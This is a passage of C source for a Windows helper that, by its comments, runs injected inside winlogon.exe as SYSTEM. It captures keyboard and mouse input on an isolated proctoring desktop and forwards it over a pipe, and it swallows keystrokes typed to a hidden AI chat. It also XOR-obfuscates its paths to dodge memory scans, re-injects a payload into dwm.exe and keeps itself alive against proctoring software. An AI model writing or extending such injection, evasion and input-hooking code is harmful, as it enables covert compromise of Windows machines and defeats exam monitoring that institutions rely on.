        lg("reader: prior reader died without release -- taking over on '%s'", deskname);
    }

    static ATOM class_atom = 0;
    const char *cls = wl_iso_input_class();   /* GUID-per-install class name */
    WNDCLASSA wc;
    for (int i = 0; i < (int)sizeof(wc); i++) ((char*)&wc)[i] = 0;
    wc.lpfnWndProc   = DefWindowProcA;
    wc.hInstance     = GetModuleHandleA(NULL);
    wc.lpszClassName = cls;
    if (!class_atom) { class_atom = RegisterClassA(&wc); }

    HWND hwnd = NULL;
    for (int i = 0; i < 20; i++) {
        /* Hidden top-level window: WS_POPUP, no WS_VISIBLE, WS_EX_NOACTIVATE
         * so it never activates or steals focus. 1x1 offscreen-ish. */
        hwnd = CreateWindowExA(WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW,
                                cls, "", WS_POPUP, 0, 0, 1, 1,
                                NULL, NULL, wc.hInstance, NULL);
        if (hwnd) break;
        DWORD e = GetLastError();
        if (e == ERROR_ACCESS_DENIED) {
            HDESK cur = OpenInputDesktop(0, FALSE, READ_CONTROL | WRITE_DAC | DESKTOP_READOBJECTS);
            if (cur) { grant_self(cur); CloseDesktop(cur); }
        }
        Sleep(150);
    }
    if (!hwnd) { lg("reader: giving up on '%s'", deskname); return; }
    lg("reader: window up on '%s' hwnd=%p", deskname, hwnd);

    RAWINPUTDEVICE rid[2];
    rid[0].usUsagePage = 0x01; rid[0].usUsage = 0x06;
    rid[0].dwFlags = RIDEV_INPUTSINK; rid[0].hwndTarget = hwnd;
    rid[1].usUsagePage = 0x01; rid[1].usUsage = 0x02;
    rid[1].dwFlags = RIDEV_INPUTSINK; rid[1].hwndTarget = hwnd;
    BOOL rok = RegisterRawInputDevices(rid, 2, sizeof(RAWINPUTDEVICE));
    lg("reader: RegisterRawInputDevices=%d", rok);

    /* Install WH_KEYBOARD_LL on this desktop so we can CONSUME keys
     * during chat-typing mode (target app on iso desktop must NEVER see
     * the user typing to our AI prompt). dwThreadId=0 covers all threads
     * on the caller's desktop. hMod=NULL is legal for LL hooks (they
     * always run in the installing process's context). */
    HHOOK hkbd = SetWindowsHookExW(13 /*WH_KEYBOARD_LL*/, wl_ll_kbd, NULL, 0);
    lg("reader: WH_KEYBOARD_LL install %s (chat-consume ARMED)",
       hkbd ? "OK" : "FAILED");

    HANDLE pipe = connect_pipe();
    lg("reader: pipe %s", pipe != INVALID_HANDLE_VALUE ? "connected" : "FAILED (will retry via WM_TIMER)");

    int ctrl = 0, shift = 0, alt = 0;
    /* Fast WM_TIMER cadence (100ms) so teardown / superseded / reconnect
     * checks always run promptly even under key-storm. */
    SetTimer(hwnd, 1, 100, NULL);
    MSG m;
    while (GetMessageW(&m, NULL, 0, 0) > 0) {
        /* Bail-out check at the top of EVERY iteration -- covers the case
         * where a prior reader instance is stuck here and needs to die on
         * next wake regardless of message type. */
        if (superseded()) { lg("reader: superseded (top-of-loop)"); break; }
        if (m.message == WM_INPUT) {
            UINT sz = 0;
            GetRawInputData((HRAWINPUT)m.lParam, RID_INPUT, NULL, &sz, sizeof(RAWINPUTHEADER));
            BYTE buf[256];
            if (sz <= sizeof(buf) &&
                GetRawInputData((HRAWINPUT)m.lParam, RID_INPUT, buf, &sz, sizeof(RAWINPUTHEADER)) == sz) {
                RAWINPUT *ri = (RAWINPUT *)buf;
                if (ri->header.dwType == RIM_TYPEKEYBOARD) {
                    USHORT vk = ri->data.keyboard.VKey;
                    /* Authoritative Message field (WM_KEYDOWN=0x100, WM_KEYUP=0x101,
                     * WM_SYSKEYDOWN=0x104, WM_SYSKEYUP=0x105). RI_KEY_BREAK bit
                     * misreports on this hardware; Message never lies. */
                    UINT kmsg = ri->data.keyboard.Message;
                    int isup = (kmsg == WM_KEYUP || kmsg == WM_SYSKEYUP);
                    if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) ctrl = !isup;
                    else if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) shift = !isup;
                    else if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) alt = !isup;
                    wire_evt e;
                    for (int i = 0; i < (int)sizeof(e); i++) ((char*)&e)[i] = 0;
                    e.type  = 0;
                    e.down  = (BYTE)(!isup);
                    e.ctrl  = (BYTE)ctrl;
                    e.shift = (BYTE)shift;
                    e.alt   = (BYTE)alt;
                    e.vk    = vk;
                    wire_send(&pipe, &e);
                    /* WL_DIAG only: log every key transition (uncapped). */
                    lg("k vk=0x%02X msg=0x%03X %s (c%d s%d a%d)",
                       vk, kmsg, isup ? "UP" : "DN", ctrl, shift, alt);
                } else if (ri->header.dwType == RIM_TYPEMOUSE) {
                    RAWMOUSE *rm = &ri->data.mouse;
                    POINT pt; GetCursorPos(&pt);
                    USHORT bf = rm->usButtonFlags;
                    wire_evt e;
                    for (int i = 0; i < (int)sizeof(e); i++) ((char*)&e)[i] = 0;
                    e.type = 1; e.x = pt.x; e.y = pt.y;
                    if (bf & RI_MOUSE_LEFT_BUTTON_DOWN)   { e.wp = 0x0201; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_LEFT_BUTTON_UP)     { e.wp = 0x0202; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_RIGHT_BUTTON_DOWN)  { e.wp = 0x0204; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_RIGHT_BUTTON_UP)    { e.wp = 0x0205; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_MIDDLE_BUTTON_DOWN) { e.wp = 0x0207; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_MIDDLE_BUTTON_UP)   { e.wp = 0x0208; e.mouseData = 0;         wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_BUTTON_4_DOWN)      { e.wp = 0x020B; e.mouseData = (1u<<16); wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_BUTTON_4_UP)        { e.wp = 0x020C; e.mouseData = (1u<<16); wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_BUTTON_5_DOWN)      { e.wp = 0x020B; e.mouseData = (2u<<16); wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_BUTTON_5_UP)        { e.wp = 0x020C; e.mouseData = (2u<<16); wire_send(&pipe, &e); }
                    if (bf & RI_MOUSE_WHEEL) {
                        e.wp = 0x020A;
                        e.mouseData = ((DWORD)(unsigned short)rm->usButtonData) << 16;
                        wire_send(&pipe, &e);
                    }
                    static POINT lastpt = { -100000, -100000 };
                    if (pt.x != lastpt.x || pt.y != lastpt.y) {
                        lastpt = pt;
                        e.wp = 0x0200; e.mouseData = 0;
                        wire_send(&pipe, &e);
                    }
                }
            }
        } else if (m.message == WM_TIMER) {
            if (superseded()) { lg("reader: superseded"); break; }
            /* Pipe reconnect off the hot path. If pipe is down (wire_send
             * invalidated it), try ONE fast connect here. Success -> next
             * event flows. Failure -> silently drop until next timer. */
            if (pipe == INVALID_HANDLE_VALUE) {
                pipe = connect_pipe();
                if (pipe != INVALID_HANDLE_VALUE) {
                    lg("reader: pipe RECONNECTED (WM_TIMER)");
                }
            }
            /* Chat event opportunistic open -- payload creates the event
             * on first chat toggle, so if we launched before that we need
             * to retry. Cheap 1 call every 100ms until it opens. */
            if (!g_chat_ev) {
                g_chat_ev = OpenEventW(SYNCHRONIZE, FALSE, wl_iso_chat_event_w());
                if (g_chat_ev) lg("reader: chat_ev opened (was pending)");
            }
            /* Desktop check. If the user (or watchdog) returned to Default,
             * bail out so the watch thread can start fresh next iso trip. */
            HDESK cur = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
            char nm[128] = {0}; DWORD n = 0;
            if (cur) { GetUserObjectInformationA(cur, UOI_NAME, nm, sizeof(nm), &n); CloseDesktop(cur); }
            if (lstrcmpA(nm, deskname) != 0) { lg("reader: desktop moved to '%s'", nm); break; }
        }
        TranslateMessage(&m); DispatchMessageW(&m);
    }
    KillTimer(hwnd, 1);
    if (hkbd) UnhookWindowsHookEx(hkbd);
    RAWINPUTDEVICE rr[2];
    rr[0].usUsagePage = 0x01; rr[0].usUsage = 0x06;
    rr[0].dwFlags = RIDEV_REMOVE; rr[0].hwndTarget = NULL;
    rr[1].usUsagePage = 0x01; rr[1].usUsage = 0x02;
    rr[1].dwFlags = RIDEV_REMOVE; rr[1].hwndTarget = NULL;
    RegisterRawInputDevices(rr, 2, sizeof(RAWINPUTDEVICE));
    if (pipe != INVALID_HANDLE_VALUE) CloseHandle(pipe);
    DestroyWindow(hwnd);
    /* v3.0.6: release the reader singleton mutex so the next attach on
     * this desktop (or a fresh iso desktop) can take over cleanly. */
    ReleaseMutex(reader_mtx);
    CloseHandle(reader_mtx);
}

/* ── Desktop watch (spawns reader when a non-Default desktop wins) ── */
static DWORD WINAPI watch_thread(LPVOID unused) {
    (void)unused;
    lg("watch up in pid=%lu", GetCurrentProcessId());
    char def[16]={0}, wl[16]={0}, ss[16]={0};
    x_decode(def, NAME_DEFAULT_x,      sizeof(NAME_DEFAULT_x));
    x_decode(wl,  NAME_WINLOGON_x,     sizeof(NAME_WINLOGON_x));
    x_decode(ss,  NAME_SCREENSAVER_x,  sizeof(NAME_SCREENSAVER_x));
    while (!superseded()) {
        HDESK hd = OpenInputDesktop(0, FALSE, GENERIC_ALL);
        char nm[128] = {0}; DWORD n = 0;
        if (hd) GetUserObjectInformationA(hd, UOI_NAME, nm, sizeof(nm), &n);
        if (hd && nm[0] &&
            lstrcmpiA(nm, def) != 0 &&
            lstrcmpiA(nm, wl)  != 0 &&
            lstrcmpiA(nm, ss)  != 0) {
            lg("watch: iso desktop '%s' -- attaching reader", nm);
            if (SetThreadDesktop(hd)) {
                run_reader(nm);
                char defw[16] = {0};
                x_decode(defw, NAME_DEFAULT_x, sizeof(NAME_DEFAULT_x));
                HDESK d = OpenDesktopA(defw, 0, FALSE, GENERIC_READ);
                if (d) { SetThreadDesktop(d); CloseDesktop(d); }
            }
        }
        if (hd) CloseDesktop(hd);
        Sleep(75);
    }
    lg("watch: exit (superseded)");
    return 0;
}

/* Legacy halt-event names (pre-GUID). We signal both on ATTACH so any
 * stale helper from a previous session generation exits cleanly during
 * the version transition. Safe to remove after everyone has rebooted
 * past v3.0.2.4. */
static const wchar_t OLD_STOP_EVENT_W[] = L"Global\\svcldb_wlinput_stop";
static const wchar_t V3_0_2_STOP_EVENT_W[] = L"Global\\NetSvcCoord_Halt";

/* =====================================================================
 * v3.0.3 (2026-09-21) -- LAYER 2+3+4: helper-hosted watchdog +
 * emergency hotkeys.
 *
 * WHY WINLOGON IS THE RIGHT HOST FOR THIS
 *   - winlogon.exe cannot be killed by any non-admin process, and even
 *     admin kills BSOD the machine (CRITICAL_PROCESS_DIED 0xEF). So our
 *     helper's threads outlive svchelper, sihost, dwm, explorer -- every
 *     process a hostile actor or bug could kill on us.
 *   - winlogon is SYSTEM in the interactive session. It has
 *     SeTcbPrivilege (WTSQueryUserToken), SeAssignPrimaryTokenPrivilege
 *     + SeIncreaseQuotaPrivilege (CreateProcessAsUser), SeDebugPrivilege
 *     (implicit via SYSTEM). Everything a resurrection needs.
 *
 * FIVE JOBS IN ONE HELPER
 *   1. (existing v3.0.2) Iso-desktop input forwarder -- watch_thread +
 *      run_reader. Untouched.
 *   2. Shell watchdog -- sentinel_thread Monitor A. If explorer.exe is
 *      gone from the active user session and rate limit allows, we
 *      CreateProcessAsUser a fresh explorer using the user's token.
 *      Beats AutoRestartShell=0 attacks (per docs/HANDOFF this-file).
 *   3. Payload watchdog -- sentinel_thread Monitor B. If the payload's
 *      Global\<guid> shutdown/liveness event stops opening and we had
 *      previously seen it alive, spawn sihost --reinject --quiet.
 *      Complement to (not replacement for) svchelper's respawnWatchdog;
 *      when svchelper is running, defer to it (avoid double-inject
 *      flicker). When svchelper is closed, WE are the watchdog.
 *   4. Emergency kill hotkey (Ctrl+Shift+Alt+Q) -- panic-quit that
 *      works even when the payload's own input path is broken. Signals
 *      payload shutdown event, writes .dwm_user_panic sentinel so our
 *      OWN watchdog respects the intent + doesn't auto-revive.
 *   5. Emergency revive hotkey (Ctrl+Shift+Alt+R) -- hardware reset
 *      button for the app. Clears sentinels, unloads any existing
 *      payload, spawns fresh sihost --reinject. Works even when
 *      payload is entirely dead (payload's own hotkeys can't fire).
 *
 * INJECTION-FILTER PROTECTION (per Nyx's DACL-lockdown design intent)
 *   Both emergency hotkeys use WH_KEYBOARD_LL and reject any event
 *   with LLKHF_INJECTED set. That means SendInput/keybd_event/
 *   PostMessage(WM_KEYDOWN) from a hostile app CANNOT trigger our
 *   emergency actions -- only real physical-keyboard events from the
 *   hardware chain pass the filter. Combined with the fact that the
 *   payload's shutdown event has a restricted DACL (per
 *   HANDOFF_2026-09-10_v2.0.md P1-ST-1), the shutdown path is walled
 *   off from every non-admin process.
 *
 * RATE LIMITING
 *   Each resurrection action (shell spawn, payload reinject) is rate
 *   limited: min 30 s between spawns, max 3 in a 5-min window, then
 *   10-min backoff. Prevents spawn-storm if we're fighting a persistent
 *   kill from something else (proctor app, misconfigured GPO). User
 *   can override the backoff via emergency-revive.
 * ===================================================================== */

/* ── Obfuscated string tables (XOR key = XKEY = 0x5C) ────────────
 * Encoded with `bytes(c ^ 0x5C for c in s)`. Decoded on use into a
 * stack buffer. Product-specific paths are hidden from raw memory
 * scans; generic Windows paths (C:\Windows\explorer.exe, winsta0\
 * default) are left plaintext because they're not svcldb IOCs. */

/* "C:\ProgramData\WinAudioSvc\sihost.exe" (37 chars + NUL) */
static const char SN_SIHOST_PATH_x[38] = {
    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('s'), XCHAR('i'), XCHAR('h'),
    XCHAR('o'), XCHAR('s'), XCHAR('t'), XCHAR('.'), XCHAR('e'), XCHAR('x'),
    XCHAR('e'), 0
};
/* "--reinject --quiet" (18 chars + NUL) */
static const char SN_SIHOST_ARGS_x[19] = {
    XCHAR('-'), XCHAR('-'), XCHAR('r'), XCHAR('e'), XCHAR('i'), XCHAR('n'),
    XCHAR('j'), XCHAR('e'), XCHAR('c'), XCHAR('t'), XCHAR(' '), XCHAR('-'),
    XCHAR('-'), XCHAR('q'), XCHAR('u'), XCHAR('i'), XCHAR('e'), XCHAR('t'), 0
};
/* "C:\ProgramData\WinAudioSvc\.dwm_user_panic" (42 chars + NUL) */
static const char SN_SENT_PANIC_x[43] = {
    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('.'), XCHAR('d'), XCHAR('w'),
    XCHAR('m'), XCHAR('_'), XCHAR('u'), XCHAR('s'), XCHAR('e'), XCHAR('r'),
    XCHAR('_'), XCHAR('p'), XCHAR('a'), XCHAR('n'), XCHAR('i'), XCHAR('c'), 0
};
/* "C:\ProgramData\WinAudioSvc\.dwm_clean_shutdown" (46 chars + NUL) */
static const char SN_SENT_CLEAN_x[47] = {
    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('.'), XCHAR('d'), XCHAR('w'),
    XCHAR('m'), XCHAR('_'), XCHAR('c'), XCHAR('l'), XCHAR('e'), XCHAR('a'),
    XCHAR('n'), XCHAR('_'), XCHAR('s'), XCHAR('h'), XCHAR('u'), XCHAR('t'),
    XCHAR('d'), XCHAR('o'), XCHAR('w'), XCHAR('n'), 0
};

/* v3.0.3 stealth: process image basenames used by sn_find_process_in_session.
 * Kept out of .rdata as plaintext -- while "explorer.exe" is a Windows-
 * standard string that blends into task-manager / process-enum utilities,
 * "svchelper.exe" is svcldb-specific and would ID us on a raw memory
 * scan of the mapped helper image. Both encoded for consistency with the
 * rest of the helper's stealth posture (which XOR-encodes even "Default"
 * / "Winlogon" desktop names). */
/* "explorer.exe" (12 chars + NUL) */
static const char SN_EXPLORER_x[13] = {
    XCHAR('e'), XCHAR('x'), XCHAR('p'), XCHAR('l'), XCHAR('o'), XCHAR('r'),
    XCHAR('e'), XCHAR('r'), XCHAR('.'), XCHAR('e'), XCHAR('x'), XCHAR('e'), 0
};
/* "svchelper.exe" (13 chars + NUL) */
static const char SN_SVCHELPER_x[14] = {
    XCHAR('s'), XCHAR('v'), XCHAR('c'), XCHAR('h'), XCHAR('e'), XCHAR('l'),
    XCHAR('p'), XCHAR('e'), XCHAR('r'), XCHAR('.'), XCHAR('e'), XCHAR('x'),
    XCHAR('e'), 0
};

/* Widen + decode helper -- decodes the XOR-encoded ASCII byte array into
 * a wchar_t buffer for use with the *W process-enum APIs. Wide buffer
 * lives on the caller's stack and is zero-init'd by caller. */
static void x_decode_w(wchar_t *dst, unsigned dst_max_wchars,
                       const char *src, size_t xsz) {
    size_t n = (xsz > dst_max_wchars) ? dst_max_wchars : xsz;
    for (size_t i = 0; i + 1 < n; i++)
        dst[i] = (wchar_t)((unsigned char)(src[i] ^ XKEY));
    dst[(n > 0) ? n - 1 : 0] = 0;
}

/* ── Sentinel/emergency helpers ─────────────────────────────────── */

/* Rate limiter -- per-action state. */
typedef struct {
    ULONGLONG spawn_ticks[3];   /* circular buffer of last 3 spawn moments */
    int       idx;
    ULONGLONG backoff_until;
} sn_rate_t;
static sn_rate_t g_sn_shell   = {{0, 0, 0}, 0, 0};
static sn_rate_t g_sn_payload = {{0, 0, 0}, 0, 0};

/* Payload watchdog: only fire re-inject if we PREVIOUSLY saw it alive
 * (mirrors svchelper's `confirmedAlive` gate; prevents spam-reinject
 * during cold boot / fresh install where payload never armed). */
static volatile LONG g_sn_confirmed_alive = 0;

/* Check + stamp: returns 1 if OK to spawn, 0 if rate-limited or backed off. */
static int sn_rate_check_and_stamp(sn_rate_t *r) {
    ULONGLONG now = GetTickCount64();
    if (now < r->backoff_until) return 0;
    ULONGLONG cutoff = (now > 5ULL * 60 * 1000) ? (now - 5ULL * 60 * 1000) : 0;
    int active = 0; ULONGLONG most_recent = 0;
    for (int i = 0; i < 3; i++) {
        if (r->spawn_ticks[i] > cutoff) {
            active++;
            if (r->spawn_ticks[i] > most_recent) most_recent = r->spawn_ticks[i];
        }
    }
    if (most_recent && (now - most_recent) < 30ULL * 1000) return 0;
    if (active >= 3) {
        r->backoff_until = now + 10ULL * 60 * 1000;
        return 0;
    }
    r->spawn_ticks[r->idx] = now;
    r->idx = (r->idx + 1) % 3;
    return 1;
}

/* Reset -- called by emergency revive so user override isn't rate-limited. */
static void sn_rate_reset(sn_rate_t *r) {
    for (int i = 0; i < 3; i++) r->spawn_ticks[i] = 0;
    r->idx = 0;
    r->backoff_until = 0;
}

/* Sentinels present? (user hit panic or clean-quit; do NOT resurrect) */
static int sn_sentinels_present(void) {
    char buf[64];
    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));
    if (GetFileAttributesA(buf) != INVALID_FILE_ATTRIBUTES) return 1;
    x_decode(buf, SN_SENT_CLEAN_x, sizeof(SN_SENT_CLEAN_x));
    if (GetFileAttributesA(buf) != INVALID_FILE_ATTRIBUTES) return 1;
    return 0;
}

static void sn_delete_sentinels(void) {
    char buf[64];
    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));
    DeleteFileA(buf);
    x_decode(buf, SN_SENT_CLEAN_x, sizeof(SN_SENT_CLEAN_x));
    DeleteFileA(buf);
}

static void sn_write_panic_sentinel(void) {
    char buf[64];
    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));

    /* v3.0.3 locked-DACL sentinel writer -- mirrors shared/common.h
     * svc_write_locked_sentinel (helper is manual-mapped standalone, so
     * we duplicate the logic inline rather than pulling shared/common.h
     * into the helper's build). Post-write DACL: SYSTEM + Admins only,
     * PROTECTED (no inherited ACEs). Any non-admin process attempting
     * CreateFileA(GENERIC_WRITE) on this file after we lock it down gets
     * ACCESS_DENIED, closing the sentinel-forgery DoS gap. Helper runs
     * as SYSTEM, so owner-WRITE_DAC is trivially satisfied. */
    HANDLE f = CreateFileA(buf, GENERIC_WRITE | WRITE_DAC, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return;

    DWORD w;
    WriteFile(f, "1", 1, &w, NULL);
    FlushFileBuffers(f);

    PSECURITY_DESCRIPTOR sd = NULL;
    ULONG sd_size = 0;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
            "D:P(A;;GA;;;SY)(A;;GA;;;BA)",
            SDDL_REVISION_1, &sd, &sd_size)) {
        BOOL dacl_present = FALSE, dacl_defaulted = FALSE;
        PACL dacl = NULL;
        if (GetSecurityDescriptorDacl(sd, &dacl_present, &dacl, &dacl_defaulted)
            && dacl_present) {
            (void)SetSecurityInfo(
                f, SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                NULL, NULL, dacl, NULL);
        }
        LocalFree(sd);
    }

    CloseHandle(f);
}

/* Payload alive probe: open the shutdown event (SYNCHRONIZE only). */
static int sn_is_payload_alive(void) {
    HANDLE ev = OpenEventW(SYNCHRONIZE, FALSE, wl_payload_shutdown_event_w());
    if (!ev) return 0;
    CloseHandle(ev);
    return 1;
}

/* Signal payload to unload cleanly (drains hooks in shutdown_watcher). */
static void sn_signal_payload_unload(void) {
    HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, wl_payload_shutdown_event_w());
    if (ev) { SetEvent(ev); CloseHandle(ev); }
}

/* Process enum: is <image basename> alive in the given session? */
static int sn_find_process_in_session(const wchar_t *image_base, DWORD session,
                                       DWORD *out_pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    int found = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, image_base) == 0) {
                DWORD ps = 0;
                if (ProcessIdToSessionId(pe.th32ProcessID, &ps) && ps == session) {
                    if (out_pid) *out_pid = pe.th32ProcessID;
                    found = 1;
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* Spawn explorer.exe as the interactive user in the given session. */
static int sn_spawn_explorer_for_user(DWORD session) {
    HANDLE userTok = NULL;
    if (!WTSQueryUserToken(session, &userTok)) {
        lg("shell-respawn: WTSQueryUserToken(%lu) failed gle=%lu",
           session, GetLastError());
        return 0;
    }
    HANDLE primaryTok = NULL;
    if (!DuplicateTokenEx(userTok, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &primaryTok)) {
        lg("shell-respawn: DuplicateTokenEx failed gle=%lu", GetLastError());
        CloseHandle(userTok);
        return 0;
    }
    LPVOID env = NULL;
    CreateEnvironmentBlock(&env, primaryTok, FALSE);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    for (unsigned i = 0; i < sizeof(si); i++) ((char *)&si)[i] = 0;
    for (unsigned i = 0; i < sizeof(pi); i++) ((char *)&pi)[i] = 0;
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"winsta0\\default";

    wchar_t cmd[MAX_PATH];
    lstrcpyW(cmd, L"C:\\Windows\\explorer.exe");
    DWORD flags = CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE;

    BOOL ok = CreateProcessAsUserW(primaryTok, NULL, cmd, NULL, NULL, FALSE,
                                   flags, env, NULL, &si, &pi);
    if (ok) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        lg("shell-respawn: explorer.exe spawned OK for session %lu pid=%lu",
           session, pi.dwProcessId);
    } else {
        lg("shell-respawn: CreateProcessAsUser failed gle=%lu", GetLastError());
    }
    if (env) DestroyEnvironmentBlock(env);
    CloseHandle(primaryTok);
    CloseHandle(userTok);
    return ok ? 1 : 0;
}

/* Spawn sihost.exe --reinject --quiet. Helper is SYSTEM in session N;
 * sihost inherits SYSTEM token, elevation check passes (TokenIsElevated
 * is 1 for SYSTEM), dwm.exe is same-session. */
static int sn_spawn_sihost_reinject(void) {
    char path[64], args[24];
    x_decode(path, SN_SIHOST_PATH_x, sizeof(SN_SIHOST_PATH_x));
    x_decode(args, SN_SIHOST_ARGS_x, sizeof(SN_SIHOST_ARGS_x));
    char cmd[192];
    wsprintfA(cmd, "\"%s\" %s", path, args);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    for (unsigned i = 0; i < sizeof(si); i++) ((char *)&si)[i] = 0;
    for (unsigned i = 0; i < sizeof(pi); i++) ((char *)&pi)[i] = 0;
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        lg("payload-respawn: sihost --reinject spawned OK pid=%lu", pi.dwProcessId);
    } else {
        lg("payload-respawn: CreateProcess failed gle=%lu", GetLastError());
    }
    return ok ? 1 : 0;
}

/* ── Emergency actions (called from LL hook thread) ────────────── */

static DWORD WINAPI sn_emergency_kill_worker(LPVOID unused) {
    (void)unused;
    lg("EMERGENCY KILL: writing panic sentinel + signalling payload unload");
    sn_write_panic_sentinel();
    sn_signal_payload_unload();
    return 0;
}

static DWORD WINAPI sn_emergency_revive_worker(LPVOID unused) {
    (void)unused;
    lg("EMERGENCY REVIVE: clearing sentinels + resetting rate limits");
    sn_delete_sentinels();
    sn_rate_reset(&g_sn_shell);
    sn_rate_reset(&g_sn_payload);
    /* Unload any existing payload first so --reinject gets a clean slate. */
    if (sn_is_payload_alive()) {
        lg("EMERGENCY REVIVE: existing payload alive -- signalling unload first");
        sn_signal_payload_unload();
        for (int i = 0; i < 40 && sn_is_payload_alive(); i++) Sleep(50);
    }
    int ok = sn_spawn_sihost_reinject();
    lg("EMERGENCY REVIVE: sihost --reinject spawn %s", ok ? "OK" : "FAILED");
    /* Auto-arm watchdog so next tick trusts a legit revive as "seen alive". */
    if (ok) InterlockedExchange(&g_sn_confirmed_alive, 0);
    return 0;
}

/* ── Emergency hotkey infrastructure (v3.0.5 hardened, 2026-09-21) ──
 *
 * MULTI-PATH ANTI-RACE ARCHITECTURE
 * (mirrors payload/src/rawinput_hook.c's proven 3-path design 1:1)
 *
 * The original v3.0.3 emergency hotkeys were LL-hook-only. That was
 * defeatable by a non-admin proctor app installing WH_KEYBOARD_LL
 * AFTER the helper (Windows LL chain is LIFO -- new hooks fire first)
 * and returning nonzero to consume Ctrl+Shift+Alt+Q/R before our hook
 * sees them. v3.0.5 mirrors the payload's rawinput_hook.c parity:
 *
 *   1. WH_KEYBOARD_LL hook (existing, sn_emerg_ll_kbd) -- fastest
 *      when uncontested. Can be raced by a proctor LL hook that
 *      installs later + consumes; still exists as the first line.
 *
 *   2. GetAsyncKeyState polling @ ~60Hz (emergency_poll_thread) --
 *      reads kernel-global win32k!gafAsyncKeyState which is NOT
 *      user-mode-hookable. NO amount of LL chain manipulation can
 *      block this path. Edge-triggered on rising-modifiers+key so a
 *      held-down chord fires once, not per-tick.
 *      This is THE reliable path.
 *
 *   3. Periodic LL rehook (emergency_reinstall_thread) -- every 5s
 *      posts WM_APP_REINSTALL to the LL thread which unhooks +
 *      re-installs SetWindowsHookExW, bumping us back to the HEAD
 *      of the LIFO chain even if a proctor installed after us.
 *      Beats the LL-chain-race in most cases; poll (path 2) is the
 *      guarantee if reinstall races the racer.
 *
 *   4. Thread-integrity watchdog (emergency_watchdog_thread) -- if a
 *      privileged (admin+SeDebugPrivilege) actor SuspendThread's the
 *      poll thread to freeze our uncontestable path, watchdog detects
 *      stale heartbeat within ~2s and issues ResumeThread(s) until
 *      the suspend count unwinds; if still stale, respawns the poll
 *      thread outright. Doesn't beat a determined admin who ALSO
 *      finds+suspends the watchdog -- ring-3 can't win against equal
 *      privilege -- but raises the bar from "one-shot suspend" to
 *      "must continuously suspend both threads faster than we recover."
 *
 * ALL FOUR PATHS converge on emergency_dispatch() which owns the
 * shared debounce state (g_sn_last_kill_tick, g_sn_last_revive_tick).
 * If two paths detect the same chord within 1500ms, only the first
 * spawns a worker; second is a no-op.
 *
 * INJECTION FILTER: LL path rejects LLKHF_INJECTED/LOWER_IL_INJECTED;
 * poll path is fed by physical hardware only (SendInput can set the
 * key-state bits BUT only briefly during the SendInput call, then the
 * OS reverts them -- our 60Hz sample rate + rising-edge detect makes
 * it essentially impossible for a synthesized transient to catch us
